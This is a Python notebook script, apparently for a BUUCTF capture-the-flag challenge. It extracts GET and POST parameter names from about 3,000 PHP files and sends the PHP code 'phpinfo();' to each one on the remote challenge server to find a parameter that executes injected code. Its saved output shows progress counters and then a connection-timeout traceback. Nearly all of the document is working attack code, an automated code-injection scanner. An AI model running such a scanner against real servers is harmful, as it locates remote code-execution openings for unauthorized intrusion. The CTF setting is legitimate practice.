# %%
import requests as req
import os,re
files = "E:/download/www/src/"
file_li = [file_name for file_name in os.listdir('E:/download/www/src')]

# %%
url = "http://b5067e42-85aa-4bad-a01f-85427b37e758.node4.buuoj.cn:81/"
cnts = 0
for fp in file_li:
    with open("E:/download/www/res.txt",'a') as wf:
        with open(files+fp,'r') as f:
            contents = f.read()
            url += fp
            get_li = re.findall("GET\[['|\"](.*)?['|\"]\]",contents)
            get_li = set(get_li)
            post_li = re.findall("POST\[['|\"](.*)?['|\"]\]",contents)
            post_li = set(post_li)
            for get_args in get_li:
                data_get = {get_args:"phpinfo();"}
                resp = req.get(url,data_get)
                print(url,'GET',resp.status_code,get_args,1 if resp.text.find('PHP Version')>=0 else 0,file=wf) 
            for post_args in post_li:
                data_post = {post_args:"phpinfo();"}
                resp = req.post(url,data_post)
                print(url,'POST',resp.status_code,post_args,1 if resp.text.find('PHP Version')>=0 else 0,file=wf)
            cnts += 1
            print(str(cnts)+"/"+str(len(file_li)),str(round(cnts/len(file_li)*100,2))+"%")
        url = "http://b5067e42-85aa-4bad-a01f-85427b37e758.node4.buuoj.cn:81/"
# Out:
# 1/3002 0.03%
# 2/3002 0.07%
# 3/3002 0.1%
# 4/3002 0.13%
# 5/3002 0.17%
# 6/3002 0.2%
# 7/3002 0.23%
# 8/3002 0.27%
# 9/3002 0.3%
# 10/3002 0.33%
# 11/3002 0.37%
# 12/3002 0.4%
# 13/3002 0.43%
# 14/3002 0.47%
# 15/3002 0.5%
# 16/3002 0.53%
# 17/3002 0.57%
# 18/3002 0.6%
# 19/3002 0.63%
# 20/3002 0.67%
# 21/3002 0.7%
# 22/3002 0.73%
# 23/3002 0.77%
# 24/3002 0.8%
# 25/3002 0.83%
# 26/3002 0.87%
# 27/3002 0.9%
# 28/3002 0.93%
# 29/3002 0.97%
# 30/3002 1.0%
# 31/3002 1.03%
# 32/3002 1.07%
# 33/3002 1.1%
# 34/3002 1.13%
# 35/3002 1.17%
# 36/3002 1.2%
# 37/3002 1.23%
# 38/3002 1.27%
# 39/3002 1.3%
# 40/3002 1.33%
# 41/3002 1.37%
# 42/3002 1.4%
# 43/3002 1.43%
# 44/3002 1.47%
# 45/3002 1.5%
# 46/3002 1.53%
# 47/3002 1.57%
# 48/3002 1.6%
# 49/3002 1.63%
# 50/3002 1.67%
# 51/3002 1.7%
# 52/3002 1.73%
# 53/3002 1.77%
# 54/3002 1.8%
# 55/3002 1.83%
# 56/3002 1.87%
# 57/3002 1.9%
# 58/3002 1.93%
# 59/3002 1.97%
# 60/3002 2.0%
# 61/3002 2.03%
# 62/3002 2.07%
# 63/3002 2.1%
# 64/3002 2.13%
# 65/3002 2.17%
# 66/3002 2.2%
# 67/3002 2.23%
# 68/3002 2.27%
# 69/3002 2.3%
# 70/3002 2.33%
# 71/3002 2.37%
# 72/3002 2.4%
# 73/3002 2.43%
# 74/3002 2.47%
# 75/3002 2.5%
# 76/3002 2.53%
# 77/3002 2.56%
# 78/3002 2.6%
# 79/3002 2.63%
# 80/3002 2.66%
# 81/3002 2.7%
# 82/3002 2.73%
# 83/3002 2.76%
# 84/3002 2.8%
# 85/3002 2.83%
# 86/3002 2.86%
# 87/3002 2.9%
# 88/3002 2.93%
# 89/3002 2.96%
# 90/3002 3.0%
# 91/3002 3.03%
# 92/3002 3.06%
# 93/3002 3.1%
# 94/3002 3.13%
# 95/3002 3.16%
# 96/3002 3.2%
# 97/3002 3.23%
# ---------------------------------------------------------------------------
# TimeoutError                              Traceback (most recent call last)
# E:\Anaconda3\lib\site-packages\urllib3\connection.py in _new_conn(self)
#     170             conn = connection.create_connection(
# --> 171                 (self._dns_host, self.port), self.timeout, **extra_kw)
#     172
#
# E:\Anaconda3\lib\site-packages\urllib3\util\connection.py in create_connection(address, timeout, source_address, socket_options)
#      78     if err is not None:
# ---> 79         raise err
#      80
#
# E:\Anaconda3\lib\site-packages\urllib3\util\connection.py in create_connection(address, timeout, source_address, socket_options)
#      68                 sock.bind(source_address)
# ---> 69             sock.connect(sa)
#      70             return sock
#
# TimeoutError: [WinError 10060] 由于连接方在一段时间后没有正确答复或连接的主机没有反应，连接尝试失败。
#
# During handling of the above exception, another exception occurred:
#
# NewConnectionError                        Traceback (most recent call last)
# E:\Anaconda3\lib\site-packages\urllib3\connectionpool.py in urlopen(self, method, url, body, headers, retries, redirect, assert_same_host, timeout, pool_timeout, release_conn, chunked, body_pos, **response_kw)
#     599                                                   body=body, headers=headers,
# --> 600                                                   chunked=chunked)
#     601
#
# E:\Anaconda3\lib\site-packages\urllib3\connectionpool.py in _make_request(self, conn, method, url, timeout, chunked, **httplib_request_kw)
#     353         else:
# --> 354             conn.request(method, url, **httplib_request_kw)
#     355
#
# E:\Anaconda3\lib\http\client.py in request(self, method, url, body, headers, encode_chunked)
#    1228         """Send a complete request to the server."""
# -> 1229         self._send_request(method, url, body, headers, encode_chunked)
#    1230
#
# E:\Anaconda3\lib\http\client.py in _send_request(self, method, url, body, headers, encode_chunked)
#    1274             body = _encode(body, 'body')
# -> 1275         self.endheaders(body, encode_chunked=encode_chunked)
#    1276
#
# E:\Anaconda3\lib\http\client.py in endheaders(self, message_body, encode_chunked)
#    1223             raise CannotSendHeader()
# -> 1224         self._send_output(message_body, encode_chunked=encode_chunked)
#    1225
#
# E:\Anaconda3\lib\http\client.py in _send_output(self, message_body, encode_chunked)
#    1015         del self._buffer[:]
# -> 1016         self.send(msg)
#    1017
#
# E:\Anaconda3\lib\http\client.py in send(self, data)
#     955             if self.auto_open:
# --> 956                 self.connect()
#     957             else:
#
# E:\Anaconda3\lib\site-packages\urllib3\connection.py in connect(self)
#     195     def connect(self):
# --> 196         conn = self._new_conn()
#     197         self._prepare_conn(conn)
#
# E:\Anaconda3\lib\site-packages\urllib3\connection.py in _new_conn(self)
#     179             raise NewConnectionError(
# --> 180                 self, "Failed to establish a new connection: %s" % e)
#     181
#
# NewConnectionError: <urllib3.connection.HTTPConnection object at 0x0000016825620278>: Failed to establish a new connection: [WinError 10060] 由于连接方在一段时间后没有正确答复或连接的主机没有反应，连接尝试失败。
#
# During handling of the above exception, another exception occurred:
#
# MaxRetryError                             Traceback (most recent call last)
# E:\Anaconda3\lib\site-packages\requests\adapters.py in send(self, request, stream, timeout, verify, cert, proxies)
#     444                     retries=self.max_retries,
# --> 445                     timeout=timeout
#     446                 )
#
# E:\Anaconda3\lib\site-packages\urllib3\connectionpool.py in urlopen(self, method, url, body, headers, retries, redirect, assert_same_host, timeout, pool_timeout, release_conn, chunked, body_pos, **response_kw)
#     637             retries = retries.increment(method, url, error=e, _pool=self,
# --> 638                                         _stacktrace=sys.exc_info()[2])
#     639             retries.sleep()
#
# E:\Anaconda3\lib\site-packages\urllib3\util\retry.py in increment(self, method, url, response, error, _pool, _stacktrace)
#     397         if new_retry.is_exhausted():
# --> 398             raise MaxRetryError(_pool, url, error or ResponseError(cause))
#     399
#
# MaxRetryError: HTTPConnectionPool(host='b5067e42-85aa-4bad-a01f-85427b37e758.node4.buuoj.cn', port=81): Max retries exceeded with url: /aQ44rYj9_rm.php (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x0000016825620278>: Failed to establish a new connection: [WinError 10060] 由于连接方在一段时间后没有正确答复或连接的主机没有反应，连接尝试失败。'))
#
# During handling of the above exception, another exception occurred:
#
# ConnectionError                           Traceback (most recent call last)
# <ipython-input-2-b659e5f64c1d> in <module>()
#      16             for post_args in post_li:
#      17                 data_post = {post_args:"phpinfo();"}
# ---> 18                 resp = req.post(url,data_post)
#      19                 print(url,'POST',resp.status_code,post_args,1 if resp.text.find('PHP Version')>=0 else 0,file=wf)
#      20             cnts += 1
#
# E:\Anaconda3\lib\site-packages\requests\api.py in post(url, data, json, **kwargs)
#     110     """
#     111
# --> 112     return request('post', url, data=data, json=json, **kwargs)
#     113
#     114
#
# E:\Anaconda3\lib\site-packages\requests\api.py in request(method, url, **kwargs)
#      56     # cases, and look like a memory leak in others.
#      57     with sessions.Session() as session:
# ---> 58         return session.request(method=method, url=url, **kwargs)
#      59
#      60
#
# E:\Anaconda3\lib\site-packages\requests\sessions.py in request(self, method, url, params, data, headers, cookies, files, auth, timeout, allow_redirects, proxies, hooks, stream, verify, cert, json)
#     510         }
#     511         send_kwargs.update(settings)
# --> 512         resp = self.send(prep, **send_kwargs)
#     513
#     514         return resp
#
# E:\Anaconda3\lib\site-packages\requests\sessions.py in send(self, request, **kwargs)
#     620
#     621         # Send the request
# --> 622         r = adapter.send(request, **kwargs)
#     623
#     624         # Total elapsed time of the request (approximately)
#
# E:\Anaconda3\lib\site-packages\requests\adapters.py in send(self, request, stream, timeout, verify, cert, proxies)
#     511                 raise SSLError(e, request=request)
#     512
# --> 513             raise ConnectionError(e, request=request)
#     514
#     515         except ClosedPoolError as e:
#
# ConnectionError: HTTPConnectionPool(host='b5067e42-85aa-4bad-a01f-85427b37e758.node4.buuoj.cn', port=81): Max retries exceeded with url: /aQ44rYj9_rm.php (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x0000016825620278>: Failed to establish a new connection: [WinError 10060] 由于连接方在一段时间后没有正确答复或连接的主机没有反应，连接尝试失败。'))
